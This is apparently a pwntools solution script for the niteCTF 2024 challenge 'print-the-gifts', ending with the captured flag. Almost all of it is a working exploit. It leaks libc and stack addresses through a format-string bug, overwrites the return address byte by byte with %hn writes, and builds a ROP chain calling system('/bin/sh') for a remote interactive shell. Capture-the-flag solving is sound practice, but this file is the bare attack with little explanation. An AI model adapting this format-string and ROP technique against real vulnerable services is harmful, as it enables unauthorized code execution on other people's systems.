from pwn import *

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']
context.arch = 'amd64'

PROG = './chall_patched'
elf = ELF(PROG)
libc = ELF('./libc.so.6')

### ------------------ EXPLOIT ------------------ ###

r = remote('print-the-gifts.chals.nitectf2024.live', 1337, ssl=True)

# pay = '.'.join([f'%{i}$llx' for i in range(20, 30)])
pay = b'%23$llx.%27$llx'
r.sendlineafter(b'>', pay)

# Parse stack and libc leak
r.recvuntil(b'you a ')
libc_leak = int(r.recvuntil(b'.')[:-1], 16)
stack_leak = int(r.recvline().strip(), 16)
log.info('Libc leak: ' + hex(libc_leak))
log.info('Stack leak: ' + hex(stack_leak))

libc.address = libc_leak - 0x2724a
ret_addr = stack_leak - 0x110
log.info('Libc base: ' + hex(libc.address))
log.info('Ret addr: ' + hex(ret_addr))

def mywrite(addr, val):
    fst = (val >> (8*4)) & 0xffff
    snd = (val >> (4*4)) & 0xffff
    thd = val & 0xffff
    for i, w in enumerate([thd, snd, fst]):
        r.sendlineafter(b'n:', b'y')
        pay = f'%{w}c%10$hn'
        pay += 'a' * (16-len(pay))
        pay = pay.encode()
        pay += p64(addr+(i*2))
        r.sendlineafter(b'>', pay)

# ROP 1: pop rdi <- /bin/sh
pop_rdi = libc.address + 0x277e5
mywrite(ret_addr, pop_rdi)

binsh = libc.address + 0x196031
mywrite(ret_addr+8, binsh)

# ROP 2: pop rsi <- 0
pop_rsi = libc.address + 0x28f99
mywrite(ret_addr+(8*2), pop_rsi)

curr = ret_addr+(8*3)
r.sendlineafter(b'n:', b'y')
pay = f'%10$lln'
pay += 'a' * (16-len(pay))
pay = pay.encode()
pay += p64(curr)
r.sendlineafter(b'>', pay)

# ROP 3: ret for 16 byte aligned
ret = libc.address + 0x26e99
mywrite(ret_addr+(8*4), ret)

# ROP 4: system
mywrite(ret_addr+(8*5), libc.sym['system'])

r.sendlineafter(b'n:', b'n')
r.interactive()
# nite{0nLy_n4ugHty_k1d5_Use_%n}
